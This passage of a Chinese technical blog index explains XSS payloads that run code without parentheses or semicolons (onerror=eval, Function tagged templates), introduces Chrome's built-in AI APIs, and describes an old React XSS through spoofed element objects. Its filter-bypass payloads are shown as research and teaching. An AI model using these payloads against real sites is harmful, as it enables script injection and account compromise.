但有些人會問說，這樣的話就只能執行 alert 而已，有沒有辦法執行任意程式碼呢？例如說 fetch 好了，我如果想要 POST 的話，一定要用到第二個參數：fetch(url, &#123; method:&#39;POST&#39;&#125;)，而上面的方法第二個參數會是個陣列，因此 fetch 會報錯，就跑不動了。 針對這個問題，我們可以先利用 function constructor，傳入字串來建立一個函式，不熟這個的之後可以去讀：如何不用英文字母與數字寫出 console.log(1)？或是Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼，但我還是先簡單介紹一下。 在 JavaScript 中，可以用 new Function(code) 來動態建立出一個函式： new Function('alert(1)') // anonymous() &#123; alert(1) &#125; 而那個 new 其實不是必須的，拿掉也無妨。再者，動態建立的函式是可以傳參數的： new Function('a', 'alert(a+1)') // anonymous(a) &#123; alert(a+1) &#125; new Function('a', 'b', 'alert(a+b)') // anonymous(a,b) &#123; alert(a+b) &#125; 最後一個參數會被當作實際的程式碼，前面的都會被當成是函式的參數，並且回傳建立好的函式。 因此，我們可以利用這點搭配剛剛講的 tagged templates，從字串建立函式： Function`alert(1)` // anonymous() &#123; alert(1) &#125; 那這個建立出來的函式，要怎麼執行呢？很簡單，再用一次相同作法就好： // 最後多加兩個 ``，就跟前面講過的 alert`1` 用法一樣 // 怕 markdown parser 出錯，多加一個空格，但有沒有都一樣 Function`alert(1)` `` 因為裡面的 alert(1) 是字串，所以括號可以直接用 unicode 來取代，這也是合法的字串表示方法，會變成： // 其實就是 alert(1) 啦 Function`alert\\u00281\\u0029` `` 這樣整個 payload 就沒有用到任何括號，但又能執行任意程式碼了！ 這個做法用到的是執行 template 時的第一個參數，也就是固定的部分，但我們也可以用到後面的參數。舉例來說： function test(a, b)&#123; console.log(a) // ['_', ''] console.log(b) // hello &#125; test`_$&#123;'hello'&#125;` 當我們同時傳入固定字串與參數時，第一個參數是所有固定的部分，這個剛提過了，而第二個參數則是我們動態傳入的變數 hello。 用上面的方法建立函式時，如同剛講過的，最後的參數會被當作 function body： Function`_$&#123;'hello'&#125;` // anonymous(_,) &#123; hello &#125; 因此這個 hello 就是我們可以控制的部分了。因為它是動態傳入的，所以能玩的方法就很多了，可以搭配網站上我們能控制的地方。舉例來說，location.hash 會回傳 URL 上的 hash 如 #test，只要加上 slice(1) 就可以把前面的 # 去掉，結合起來就是： // 從剛剛講到的這個開始 Function`_$&#123;'hello'&#125;` // 先換成 location.hash.slice(1) Function`_$&#123;location.hash.slice(1)&#125;` // 把 slice(1) 換成 `` Function`_$&#123;location.hash.slice`1`&#125;` // 最後再加上 `` 執行函式 // 記得把網站的 hash 弄成 #alert(1) Function`_$&#123;location.hash.slice`1`&#125;` `` 就組出了一個不用括號但卻能執行任意程式碼的 payload，把實際要執行的字串放在 hash，動態去執行 hash 中的程式碼。 onerror 事件前面寫這麼多其實還沒進入正題，開頭提的原文發現的是另外一種更巧妙的方法。 在瀏覽器環境中，利用 window.onerror，可以接收到所有沒有被 catch 的錯誤事件： onerror = (err) => console.log('Err:' + err.toString()) throw 'hello'; // Err:Uncaught hello 話說上面這段程式碼直接在 DevTools 執行會不起作用（原因在原文有講到，在 console 直接執行時錯誤不會被丟到 onerror），請開一個 HTML 來測。 總之呢，上面的程式碼告訴我們在 Chrome 上，被捕捉到的錯誤訊息會是 Uncaught hello。 那如果我們直接把 onerror 換成 alert 呢？ onerror = alert; throw 'hello'; 你就會直接看到一個 Uncaught hello 的 popup。上面的 payload 是沒有用到任何括號的，也達成了執行函式的目的。 再進一步延伸，就是把 onerror 換成 eval，把錯誤訊息當成 JavaScript 程式碼來執行，但問題是換成 eval 之後，要怎麼湊出合法的程式碼？ 由於被捕捉到的錯誤訊息會是：Uncaught &#123;payload&#125;，這整句會被當成是程式碼來執行，因此只要把 payload 換成：=alert(1)，整句就是：Uncaught=alert(1)，把錯誤訊息中的 Uncaught 當成是變數來用了，如此一來就是合法的程式碼： onerror = eval; throw '=alert(1)'; 如果還是不知道原理的話，把 eval 換成 console.log 就很清楚了： onerror = console.log; throw '=alert(1)'; // Uncaught =alert(1) 再來，由於 throw 後面接的是字串，所以可以跟前面一樣用 encoding 來代替，用 \\x28 或是 \\u0028 都行： onerror = eval; throw '=alert\\x281\\u0029'; 就湊出了一個不需要括號的 payload。 再省去分號Tagged template strings 已經不需要分號了，因此我們繼續沿著 onerror 這條路走，看看怎麼把分號省掉。 一個簡單直覺的想法是用逗號就好（為了方便舉例，底下都用 alert 了）： onerror=alert,throw 1; 但跑了以後會發現報錯：Uncaught SyntaxError: Unexpected token &#39;throw&#39;，這是因為 throw 不是個 expression 而是 statement，因此不能放在逗號後面，我們需要別的方法。 在 JavaScript 中就算你沒有用 if 或其他需要區塊的程式碼，也可以自己用區塊把程式碼包起來： &#123; let a = 1; console.log(a) &#125; 這在開發上是確實會用到的（儘管不多），用途就是刻意建立區塊並且搭配 let 或是 const 的關鍵字，讓變數只活在這個區塊裡。 只要利用區塊，就可以達成不用分號也能分隔程式碼的目的了： &#123;onerror=alert&#125;throw 1 除了利用區塊以外，還有其他更酷炫的方法。 先來講一下 JavaScript 中逗號的用法，基本上就是串聯幾個 expression 並回傳最後一個的結果，如： if (console.log(1), alert(1), true) &#123; console.log(true) &#125; else &#123; console.log(false) &#125; // 1 // true if 中的表達式會依序執行 console.log(1)、alert(1) 最後回傳 true，因此 if 的結果成立，印出 true。 而 throw 後面可以接一個表達式，因此你可以： throw onerror=alert,1 就會先執行 onerror=alert，再執行 throw 1，跟我們用 &#123;&#125; 的做法達成的效果是一樣的，這就是另外一種不需要分號的方法。 Chrome 的地方就到這裡結束了，接下來都是為了 Firefox 所做的努力。 在 Firefox 中有錯誤時，它錯誤訊息的格式不一樣： onerror=alert; throw 1; // uncaught exception: 1 在這個錯誤訊息之下，組不出來合法的程式碼，之前提的把 onerror 換成 eval 就沒用了。 於是 Gareth Heyes 就繼續深挖，發現了兩件事情。第一件事情是，如果 throw 一個 Error 而不是字串，錯誤訊息就不會有這些惱人的 prefix，只剩一個 Error:： onerror=alert; throw new Error(1); // Error: 1 由於 Label: 在 JavaScript 是個合法的程式碼，所以後面直接放程式碼就好，輕輕鬆鬆： onerror=eval; throw new Error('alert(1)'); 但用了 Error() 的話就有括號了，而 Gareth Heyes 的第二個發現是，在 Firefox 上你可以 throw 一個 error-like object，也能達到相同效果： onerror=eval; throw &#123;lineNumber:1,columnNumber:1,fileName:1,message:'alert\\x281\\x29'&#125;; 總而言之呢，這些都是為了要控制 Firefox 最後產生的錯誤訊息，只要能控制，就能組成合法程式碼丟到 eval 去執行。 剛好最近看到 Gareth Heyes 發推，說 Firefox 要把這個功能修掉了：Firefox removed support for throwing error-like objects，於是他就找出了一個新的方法： throw onerror=eval,x=new Error,x.message='alert\\x281\\x29',x 看起來是要 new Error 的話，不需要括號也可以。有了一個 Error 物件之後再設定 message，就一樣能控制錯誤訊息。 其他 payload原文底下有其他人提了另外兩個 payload。 第一個來自 @terjanq： throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337,3331,117]+a[13] 這個 payload 我試了一下目前只能在 Chrome 執行，很明顯可以拆成幾個部分： /a/ Uncaught=1 g=alert a=URL+0 onerror=eval throw /1/g+a[12]+[1337,3331,117]+a[13] 因為是用逗號接起來的，所以 throw 的會是最後的那一段。 先從最後一段開始好了，這個 throw /1/g+a[12]+[1337,3331,117]+a[13] 是幹嘛的。 首先呢，a 是 URL+0，而 URL 是個 global 的函式，函式 + 0 會變字串，所以 a 是 &quot;function URL() &#123; [native code] &#125;0&quot;，因此 a[12] 跟 a[13] 分別就是 ( 跟 ) 了。 而 /1/g 是個 regexp，變成字串的時候會是 &quot;/1/g&quot;。至於 [1337,3331,117] 這個陣列，變字串時會呼叫 join，結果就是 &quot;1337,3331,117&quot;。 結合在一起，/1/g+a[12]+[1337,3331,117]+a[13] 就會是 /1/g(1337,3331,117)。 再搭配前面講過的，throw 什麼錯誤訊息就會是什麼，產生的錯誤訊息為： Uncaught &#x2F;1&#x2F;g(1337,3331,117) 這邊的 / 雖然之前是當作 regexp，可是在現在的程式碼中，其實是算數的除法，也就是 a / b / c，其中 a 是 Uncaught，b 是 1，c 是 g(1337,3331,117)。 而 Uncaught 如果沒宣告就會出錯，所以才需要 Uncaught=1，接著 g 會被當成函式執行，因此 g=alert。 那最前面的 /a/ 呢？這個應該只是不想讓 throw 跟後面的 payload 有空格所以才加的，實際上沒其他作用。 這個解法的精華在於 throw 的時候讓錯誤訊息變成 Uncaught /1/g(1337,3331,117)，是一段合法的程式碼，只要把一些前提補齊，就可以成功呼叫 g 這個函式。 第二個來自 @cgvwzq： TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//'] 這邊其實分成兩句，第一句是：TypeError.prototype.name =&#39;=/&#39;，這句是把 TypeError 的名稱強制修改成 =/。 如果沒有這一句的話，0[0][&#39;test&#39;] 的錯誤訊息是：Uncaught TypeError: Cannot read properties of undefined (reading &#39;test&#39;) 0[0] 會是 undefined，而 undefined[&#39;test&#39;] 就會拋出這個 TypeError。 當我們強制把 name 改掉以後： TypeError.prototype.name ='hello!'; 0[0]['test']; // Uncaught hello!: Cannot read properties of undefined (reading 'test') 就可以控制原本 TypeError 的部分，變成任意字串。 而另外一句 0[onerror=eval][&#39;/-alert(1)//&#39;]，0[onerror=eval] 其實就只是把賦值放在 [] 裡面，賦值以後等同於 0[eval]，這個會回傳 undefined，於是就會拋一個 TypeError 出來。 換個方式看好了，底下程式碼： TypeError.prototype.name ='&#123;1&#125;'; 0[eval]['&#123;2&#125;']; 在 Chrome 上會產生的錯誤訊息為： Uncaught &#123;1&#125;: can&#39;t access property &quot;&#123;2&#125;&quot;, 0[eval] is undefined 現在的問題就變成，該怎麼透過控制上面的字串，讓錯誤訊息變成合法的程式碼？ 在 &#123;1&#125; 的地方作者放了 =/，合起來就是 Uncaught=/，這個 / 其實是 regexp 的意思，因此這個方法的思路為，讓 &#123;2&#125; 前面那一堆字串（: can&#39;t access property &quot;）都變成 regexp 的一部分。 因此 &#123;2&#125; 的地方開頭為 /，把前面湊成一個 regexp，接著用 -alert(1) 去執行函式，這邊改成 +alert(1) 也行，就只是要把兩個操作串起來而已。執行完以後，後面的程式碼全都用 // 註解掉，就可以不用管了。 但如果你實際去跑上面這段 payload，會發現 Chrome 回傳錯誤訊息：Invalid regular expression ... Unterminated group，這是因為錯誤訊息裡面有個 (，那時可能還沒有，造成 regexp 語法有誤，只需要加個 ) 就行了： TypeError.prototype.name ='=/',0[onerror=eval][')/-alert(1)//'] 產生的錯誤訊息就會是： Uncaught =/: Cannot read properties of undefined (reading ')/-alert(1)//') 稍微簡化一下就是： Uncaught =/regexp/-alert(1)//... 話說這個 payload 在 Chrome 139 上沒問題，Firefox 142 則會報錯：Uncaught SyntaxError: expected expression, got &#39;=&#39;。 想要 debug 的話，把 onerror=eval 改成 onerror=console.log 就好，先看一下產生的錯誤訊息長怎樣： &#x3D;&#x2F;: can&#39;t access property &quot;)&#x2F;&#x2F;alert(1)&#x2F;&#x2F;&quot;, 0[console.log] is undefined 看來 Firefox 上，TypeError 的 name 前面沒有任何東西，因此要讓 Firefox 可以動的話，前面隨便加個可以當變數的字元就行： TypeError.prototype.name ='a=/',0[onerror=eval]['/-alert(1)//'] 若是真的有理解這個做法，只要延續這個思路，其實在 TypeName 那邊就可以插入程式碼了，結果是一樣的，但帥氣度沒這麼高（在 Chrome 上沒問題）： TypeError.prototype.name ='=alert(1)//',0[onerror=eval][2] 至於要怎麼組出一個 Chrome 跟 Firefox 都可以的 payload，讀者可以自行練習，或是參考我組出來的一個範例，多加了一些變形： TypeError.prototype.name ='+/[',[onerror=eval][window.Uncaught++][']/-alert\\501\\51&lt;!--'] 總結其實不管是哪個 payload，核心概念都是相同的，只要把錯誤訊息變成合法的 JavaScript 程式碼，再丟給 eval 執行即可。 要看懂 payload，無非就是要對 JavaScript 程式碼比較熟悉，例如說 0[onerror=eval] 或是逗號的用法，至少要知道在幹嘛。 除此之外，就是發揮想像力了，這個就比較難練習，通常都會從觀察模仿開始。 最後整理幾個關鍵點： 逗號可以串連多個 expression，會回傳最後一個 把 onerror 換成 eval，就能把錯誤訊息當程式碼執行 throw 出去的錯誤會變成錯誤訊息的一部分 只要能讓錯誤訊息變成合法程式碼就大功告成","link":"/2025/09/15/xss-without-semicolon-and-parentheses/"},{"title":"Chrome 內建的翻譯與 Prompt API","text":"前陣子有個讀者分享給我他自己做的 Chrome extension：JP NEWS Helper，能夠摘要、翻譯 NHK News Easy 上面的文章，幫助學日文。 由於這個擴充套件是開源的，因此我第一件好奇的事就是：「它是用哪一間 AI 的服務，key 怎麼處理？」，結果看了 source code 才發現居然是 Chrome 內建的 Web API，不是我以為的 HTTP API。 算是有點後知後覺，現在才發現原來有內建的 Web API 可以用，因此寫篇文章簡單記錄一下。 Chrome 的內建 AI 相關 API如果想直接看 Google 的官方影片，可以參考這個：The future of Chrome Extensions with Gemini in your browser，文字版的話則是這篇：內建 AI API。 Chrome 從 138 版本開始（寫這篇文章當下，最新穩定版是 140），提供了三個內建的 Web API： Translator API，翻譯 Language Detector API，偵測語言 Summarizer API，摘要文章 這三個 API 在使用前會需要下載一些小模型，而整體的使用方式超級簡單，底下以翻譯的功能為例。 首先，會需要檢查是否可用以及是否需要下載： const translator = await Translator.create(&#123; sourceLanguage: 'en', targetLanguage: 'zh-TW', monitor(m) &#123; m.addEventListener('downloadprogress', (e) => &#123; console.log(`Downloaded $&#123;e.loaded * 100&#125;%`); &#125;); &#125;, &#125;); 那個 monitor 就是監控下載進度用的，以翻譯來說滿快就可以下載完。 下載完之後，只要一行程式碼就可以翻譯： await translator.translate('How are you?'); // 你好嗎? 就這樣，沒了，超級簡單。 不過我試了一下，翻譯的品質沒有到很好，還是比不上直接去用真的大型 LLM 模型。但這功能可以直接內建在 Web API 裡，已經是一大進步了。 Prompt API除了開頭提的那三種，也有幾個還在測試中的 API，如 prompt API，就是可以直接下 prompt，跟平常使用 ChatGPT 等等的 API 差不多。目前要用的話需要去申請個 origin trial 拿 key，我之前有寫過怎麼申請：透過 Chrome Origin Trials 搶先試用新功能。 我做了一個 demo 網站，有興趣可以玩玩看。因為 prompt API 的模型滿大的，建議在非手機網路環境下載，否則網路流量可能會爆掉。 另外，由於這個 API 還在測試階段，所以可能會有些問題。我一開始自己玩幾次都沒問題，但後來好像踩到了什麼 bug，每次問 AI 後都會直接系統級 panic，整個 Mac 當掉自動重開。 https://aszx87410.github.io/demo/ai/prompt-api.html 而這個 API 的使用方法也超簡單，第一步同樣是確認可用性以及下載： await LanguageModel.create(&#123; monitor(m) &#123; // 監控下載進度 m.addEventListener('downloadprogress', (e) => &#123; updateProgress(e.loaded); if (e.loaded >= 1) &#123; updateStatus('✅ AI 下載完成並已就緒！', 'available'); &#125; &#125;); &#125; &#125;); 下載完之後就可以用了： const session = await LanguageModel.create(); const response = await session.prompt('你可以做什麼？'); console.log(response) 有更多參數可以調整啦，而且可以支援更複雜的對話，上面只是一個很基礎的範例而已。 儘管模型不大，可以做的事情也沒有其他大模型多，但是在瀏覽器上面放一個可以在本地跑的小模型，已經能分擔掉一部分需要 API key 才能做的事了。 現在 Chrome 也越來越積極把小模型直接包在裡面，提供更多原生的 AI 功能，而未來開發者也可以運用這些 Web API 直接開發產品，不需要自己準備後端。 其他瀏覽器呢？Translation API 已經隨著 Chrome 138 一起正式發佈，Google 也訂出了相關標準，不過目前 Firefox 跟 Safari 則是還在很早期的階段。 Firefox 對目前的 API design 不太滿意，有提了另一個版本。而 Safari 對目前的做法也有一些隱私與資安上的考量，看起來還沒什麼進展。 至於其他更強大的 API 如 Prompt API，Firefox 直接對目前的提案給了個 negative，而 Safari 那邊看起來似乎沒什麼消息。 因此，這篇所提到的東西目前都只有 Chromium-based 的瀏覽器可以用，如 Chrome 與 Edge。未來其他瀏覽器會不會跟上，還是個未知數。 結語各種 AI 與現有產品的整合勢在必行，瀏覽器身為使用者會重度使用的應用程式，更是兵家必爭之地。 例如說 Perplexity 自己推了個 Comet Browser，而 Chrome 也有越來越多內建的 AI 功能。 如果 AI 沒騙我的話，目前 Chrome 的 Prompt API 用的是 Gemma，Edge 上的是 Phi。 當瀏覽器內建的 AI 模型越來越進化，能做的事情就更多了。不過以目前的狀況來看，在本地能跑的模型絕對是很有限的，畢竟能用的資源就那些，效果還是沒有那些大模型來得好，但未來可以持續關注，應該會一直不斷進化。","link":"/2025/09/27/chrome-built-in-prompt-api/"},{"title":"從 React 中學習 JavaScript 底層運作","text":"前陣子去 JSDC 的線上前導活動分享了這個主題，想說既然都分享了，不如就寫篇文章好了。這篇文章的靈感來源以及內容其實都是來自於《JavaScript 重修就好》。當初寫書的時候就有參考 React 原始碼中的一些東西，這篇只是把原本分散在書中的各個 React 相關章節整理起來重寫一遍。 我覺得從這些開源專案的程式碼中學一些新的概念滿有趣的，畢竟這些很多人用的框架通常碰過的 bug 也越多，學到這些問題的解法以後，也可以再回去反思以前自己學過的東西。 這篇分成三個小章節： React 舊版的 XSS 從 React Fiber 學習 event loop 從 V8 bug 學習底層運作 開頭先聲明一下，雖然標題叫做「從 React 中學習 JavaScript 底層運作」，只有最後一個比較底層，第一個更是與底層沒什麼關係。只是我沒想到比這個更好的標題，因此就用這個了。 React 舊版的 XSS 漏洞請問底下這段程式碼有什麼資安問題？ function Test() &#123; const name = qs.parse(location.search).name; return ( &lt;div className=\"text-red\"> &lt;h1>&#123;name&#125;&lt;/h1> &lt;/div> ) &#125; 看一看好像沒什麼問題？不就 render 一個 name 嗎，在 React 裡面會自動做 encode，所以就算插入一個 &lt;img&gt; 也不會被當作標籤解析，而是會被轉換成純文字，看起來沒問題。 若是我們繼續把這段程式碼展開，從 JSX 變成 JavaScript，大概會類似於這樣： function Test() &#123; const name = qs.parse(location.search).name; return createElement( 'div', &#123; className: 'text-red' &#125;, createElement( 'h1', &#123;&#125;, name ) ) &#125; JSX 語法會在 compile 的時候變回 JavaScript，舊版會用 React.createElement，新版改成 _jsx 了，但不管 API 長怎樣，總之就是一段建立 element 的 JavaScript。 而這些 function 執行完以後就會產生所謂的 virtual DOM，再次展開成 object 的話會類似於： function Test() &#123; const name = qs.parse(location.search).name; return (&#123; type: 'div', props: &#123; className: 'text-red', children: &#123; type: 'h1', props: &#123; children: name &#125; &#125; &#125; &#125;) &#125; 而 React 在 render 的時候，就會根據這個 object 去 render，並且展示出我們所傳入的 name。 但問題來了，像是 qs 這種 library，其實是支援物件的，例如說 ?name[test]=1，name 會變成 &#123;&quot;test&quot;: 1&#125;，因此這個 name 雖然你怎麼看都應該是字串，但實際上可以是個物件。 儘管通常傳物件會被 React 擋掉，但你有沒有想過這些 component 其實也是個物件？那 React 是怎麼決定一個 object 到底是不是 component 的呢？ 在舊版的 React 中，這個檢查非常簡單： ReactElement.isValidElement = function(object) &#123; return !!( typeof object === 'object' &amp;&amp; object !== null &amp;&amp; 'type' in object &amp;&amp; 'props' in object ) &#125; 只要有 type 有 props，就把它看作是一個 React component。因此，如果我們的 name 是底下這樣，就會被當作是 React component 被渲染出來： &#123; type: \"div\", props: &#123; dangerouslySetInnerHTML: &#123; __html: \"&lt;img src=x onerror=alert()>\" &#125; &#125; &#125; 如此一來，就成功利用了這個特性，假裝是 React component 並且 render 出任意的 HTML，構造出了一個 XSS 漏洞。 這個漏洞最早在 2015 年時被 Daniel LeCheminan 發現，還寫了一篇文章：XSS via a spoofed React element，不過原文的情境稍微不同就是了。 總之呢，這個問題被 React 關注到，開了一個 issue 進行討論：How Much XSS Vulnerability Protection is React Responsible For? #3473，而最後的 fix 在這：Use a Symbol to tag every ReactElement #4832。 解法就是：Symbol。 在 React component 上加了一個 $$typeof: Symbol.for(&#39;react.element&#39;)，並且在 isValidElement 的檢查中也把這個判斷加上，就能確保其他物件沒辦法偽造出一個 React component。 背後的原理就是 symbol 的特性，與一般的物件不一樣，symbol 就只會跟同一個 symbol 相等，而 JSON 反序列化是不支援 symbol 的，所以你只能創造出普通的物件，沒辦法做出一個 symbol，自然就偽造不了 component 了。 以後有人問你 symbol 可以用在哪裡的時候，可以拿這個案例去回答。 另外，其實除了前端，後端也是一樣的，例如說 JavaScript 的 ORM：Sequelize 舊版本的 operator 也是用字串，例如說： Post.findAll(&#123; where: &#123; authorId: &#123; '$or': [12, 13] &#125; &#125; &#125;); 但從 v5 開始就全部換成 symbol 了，已經棄用了原本的字串： const &#123; Op &#125; = require('sequelize'); Post.findAll(&#123; where: &#123; authorId: &#123; [Op.or]: [12, 13] &#125; &#125; &#125;); // operators.ts export const Op: OpTypes = &#123; eq: Symbol.for('eq'), ne: Symbol.for('ne'), gte: Symbol.for('gte'), or: Symbol.for('or'), // [...] &#125; 背後原因相同，都是資安上的考量，當初的 PR 在這裡：Secure operators #8240。 話說直播的時候有人問，那如果你可以創造出一個 symbol，是不是這些防禦就沒用了？答案是：沒錯。但通常你要能做出 symbol，要嘛你已經可以執行程式碼了，要嘛開發者要自己加一個可以建立 symbol 的 deserializer，這兩個的達成難度都滿高的。 從 React Fiber 學習 event loop2018 年的時候我寫過一篇 React fiber 相關的文章：淺談 React Fiber 及其對 lifecycles 造成的影響，而這個機制一語道破其實就是：「把同步的大 task 切成多個非同步的小 task」，藉此來避開阻塞 main thread。 那在 JavaScript 裡面，該怎麼來實作這個機制呢？要怎麼安排這些非同步的 task 呢？ React 16.0.0 - requestIdleCallback在最早的 React 16.0.0 版本中，是用瀏覽器內建的 API：requestIdleCallback 來做的，MDN 的描述是： The window.requestIdleCallback() method queues a function to be called during a browser’s idle periods. This enables developers to perform background and low priority work on the main thread, without impacting latency-critical events such as animation and input response. window.requestIdleCallback() 方法會插入一個函式，並在瀏覽器處於閒置時呼叫該函式。這讓開發者能在主事件迴圈中執行背景或低優先度的工作，而不會影響到像動畫或使用者輸入回應這類對延遲敏感的事件。 把原本大的 task 切成小的 task 以後，用 requestIdleCallback 來安排下一個 task，讓瀏覽器在空閒的時候執行，就能不阻礙到 main thread。 React 16.4.0 - requestAnimationFrame + postMessage但是在 React 16.4.0 時，被換成了另一種結合 requestAnimationFrame（以下簡稱 rAF） 跟 postMessage 的方式（這個方式其實一開始是做為沒有 requestIdleCallback 時的替代方案，但在這個版本被扶正，直接取代掉了 requestIdleCallback）。 在這個機制中，會建立兩種類型的 callback，一個是利用 rAF 安排的 callback，由瀏覽器自動觸發，而另一個則是用 window.addEventListener(&#39;message&#39;, fn) 安排的 callback，透過 window.postMessage 來觸發。 這個機制實際運作的方式是這樣的，底下每一個 tick 代表一次的 event loop，我們先安排一個 rAF，在裡面計算下次 rAF 應該觸發的時間（就是當前時間 + frame 長度(如 16ms)）： 接著在裡面再次呼叫 rAF 還有 postMessage，安排下一次 tick 的 callback： 下一步是 browser render，結束之後進入下一個 tick，然後 message handler 被觸發： 由於剛剛已經計算過下次 rAF 應該被觸發的時間，所以 message handler 可以趁著這段時間（可能有個 5ms 或更長） 做事，在時間到之前不斷執行小的 task。 執行完以後 rAF 會再次觸發，做跟剛剛一樣的事情，安排下一個 tick 的 callback，然後 browser render，結束這個 tick： 這樣的流程不斷執行下去，就是整個非同步 task 的任務安排機制了，簡單來講就是： 在 rAF 裡面算出有多少時間可以執行 task 而不干擾 render 在 message handler 中盡量執行任務 在 React 原始碼中，rAF 會被叫做 Animation Tick，而 message handler 叫做 Idle Tick。 那為什麼要用 postMessage 跟 message handler 呢？原因是如果用 setTimeout(fn, 0) 的話，有個經典的 4ms 限制，如果你不斷利用 setTimeout 來安排 task，在重複遞迴安排幾次之後，最短的執行間隔就會變成 4ms，不論你 interval 設多少都一樣。 而 postMessage 跟 message handler 則沒有這個限制，因此就選了這個。 但是用 message handler 有個缺點，那就是目前的使用方式是 window.addEventListener(&#39;message&#39;, fn)，因此每次安排 task 時都必須使用 window.postMessage，若是頁面上有別的 listener，就會一直一直被觸發。 像是有些擴充套件可能會印出所有收到的 message 來幫助 debug，可能每 30ms 左右就會收到一個，log 直接被打爆。像這樣有 side-effect 的行為顯然不是什麼好事，會干擾到其他的實作。 React 16.7.0 - requestAnimationFrame + MessageChannel所以從 React 16.7.0 開始，就把這段改用 MessageChannel 來做了，這是另一個可以實作訊息交換的 Web API，用法跟原本的其實很像，只是多了個 port 的概念： // DOM and Worker environments. // We prefer MessageChannel because of the 4ms setTimeout clamping. const channel = new MessageChannel(); const port = channel.port2; channel.port1.onmessage = performWorkUntilDeadline; schedulePerformWorkUntilDeadline = () => &#123; port.postMessage(null); &#125;; 在程式碼的註解中也可以看到為什麼 React 不用 setTimeout，跟我剛剛講的理由是一樣的，加上這個改動的 PR 在這：[scheduler] Post to MessageChannel instead of window #14234。 看起來好像就是這樣了？這個機制滿合理的，透過兩種不同類型的非同步 task 做不同的事情，並且在不干擾到 render 的前提下盡量做事。 React 16.12.0 - MessageChannel但是，在 React 16.12.0 時，機制又變了一次，把 rAF 也拿掉了，只留下 MessageChannel 而已，每次執行最多 5ms： 那為什麼要換成這個機制呢？有兩個地方有說明，第一個是 16.12.0 裡的程式碼： // Scheduler periodically yields in case there is other work on the main // thread, like user events. By default, it yields multiple times per frame. // It does not attempt to align with frame boundaries, since most tasks don't // need to be frame aligned; for those that do, use requestAnimationFrame. let yieldInterval = 5; 翻中文是： 調度器會定期讓出執行權，以便主執行緒上若有其他工作（例如使用者事件）能夠被處理。預設情況下，它在每一幀中會讓出多次。它不會嘗試與畫面更新（frame）邊界對齊，因為大多數任務不需要與畫面對齊；若是需要對齊畫面更新，請使用 requestAnimationFrame。 大意就是因為任務不需要跟畫面 render 對齊，所以就不管 render 了，反正就是一直讓出去。 第二個説明則是在 Concurrency &#x2F; time-slicing by default #21662 這個 issue 中，有人問說 scheduler 是不是還在用 requestIdleCallback 時，dan 哥的留言： No, it fired too late and we’d waste CPU time. It’s really important for our use case that we utilize CPU to full extent rather than only after some idle period. So instead we rewrote to have our own loop that yields every 5ms.不行，那個（機制）觸發得太晚，會浪費 CPU 時間。對我們的使用情境來說，盡可能充分利用 CPU 非常重要，而不是等到某個閒置時間才開始做事。所以我們改成自己寫一個每 5ms 就讓出一次的循環。 解惑了為什麼一開始把 requestIdleCallback 淘汰掉，因為觸發的太晚了。 那現在最新的 v19.2.0 版本的實作又是如何呢？ 從程式碼中可以看出來，基本上就是上面那一套機制了，沒有太多改變，一樣是用 MessageChannel 安排 task，然後每隔一段時間讓出去。 不遠的未來：原生 Scheduler API其實 Scheduler 這東西不止 React，只要需要非同步安排任務的都會用到。因此，瀏覽器其實有提供原生的 Scheduler API，只是很新所以支援度不太好，但可以預見在未來可能不需要自己寫一套了，用瀏覽器原生給的會是最好的。 事實上，React 現在就有用這個實作一套了，但還是 unstable 的狀態：SchedulerPostTask.js，原生直接支援安排不同優先順序的任務，比自己寫方便多了。 總之，從 React 對於安排非同步任務的程式碼中，可以學到幾個不同函式觸發的時機以及頻率的差別，也可以從這幾次的機制變動中，去了解為什麼 React 做出了這樣的選擇，讓我們更了解這些非同步的細節差異。 從 V8 bug 學習底層運作延續剛剛講的 React fiber，在程式碼中有一段 profiler 相關的部分： if (enableProfilerTimer) &#123; this.actualDuration = -0; this.actualStartTime = -1.1; this.selfBaseDuration = -0; this.treeBaseDuration = -0; &#125; 問題來了，為什麼這邊的初始值是 -0 而不是 0？這兩個有什麼差異呢？ 甚至在舊一點的版本中，還先賦值成 NaN 才變成 0，這又是什麼魔法？ if (enableProfilerTimer) &#123; this.actualDuration = Number.NaN; this.actualStartTime = Number.NaN; this.selfBaseDuration = Number.NaN; this.treeBaseDuration = Number.NaN; this.actualDuration = 0; this.actualStartTime = -1; this.selfBaseDuration = 0; this.treeBaseDuration = 0; &#125; 這一切都跟 V8 底層的運作以及一個 bug 有關。 針對這件事情，其實 V8 自己有一篇部落格文章：The story of a V8 performance cliff in React，裡面講的已經很好了，麻煩自己去讀這篇文章，或是跟 AI 一起看，我就不再重複一次，底下只講結論跟重點。 首先，儘管我們都知道在 JavaScript 的規格中，所有的數字都是 double，但是 JavaScript 引擎在實作時可不一定，畢竟如果真的每個數字都存成 64bit 的 double，既會有空間問題也有效能問題，整數做加減也會是浮點數運算，誰受得了。 因此，在 V8 引擎中，其實數字還是有分兩種，一種是 32bit 的 int 叫做 small integer，簡稱 Smi，而另外一種就真的是浮點數了，叫做 HeapNumber，兩種存的位置是不同的，浮點數要存到 heap 去。 而為了幫 object 做一些優化，因此 object 在儲存時，會關聯到一個叫 shape 的東西，類似於 object 的 metadata，來存每個值的 type 以及 offset，同樣 interface 的 object 會共享同一個 shape。 在 object value 的型別改變時，這個 shape 也會一起跟著變，例如說從 Smi 變成 double，就會產生一個新的 shape。 而 V8 的這個 bug 簡單來講就是在 React profiler 中一開始會把某些值初始化成 0，型別是 Smi，接著用 Object.preventExtensions 來阻止新增新的屬性，然後把這個值改成浮點數（performance.now() 的回傳值）。 這樣的行為讓 V8 壞掉，不知道該怎麼處理 shape 的改變，於是就新增了一個全新的 shape。而且不只針對這一個 object，是所有類似的 object 都會，都無法共享 shape，而是每人有一個自己的。 儘管大多數人都不會察覺這種底層的差別，但因為 React 在測試時 node 數量很多，當基數放大後就能察覺到差異，演變成了一個性能問題。 雖然 V8 把 bug 修掉，所以現在不會有這問題了，但是 React 那邊也修了一版，例如說剛提到的 NaN，會設置成 NaN 是因為它底層是浮點數而不是 Smi，而現今的版本之所以是 -0 也是一樣的原因，-0 是浮點數，0 是 Smi。 當初始值跟後來的值都是浮點數時，就不會有這個 shape 改變的問題，也就不會碰到這個 V8 bug。 但是，你有沒有想過要怎麼知道 NaN 跟 -0 是浮點數呢？ 從 V8 bytecode 看底層型別除了翻規格以外，把程式碼編譯成 V8 bytecode 其實是個很好的方法，例如說底下的函式： function test(x) &#123; return x === 0; &#125; function AAAAA () 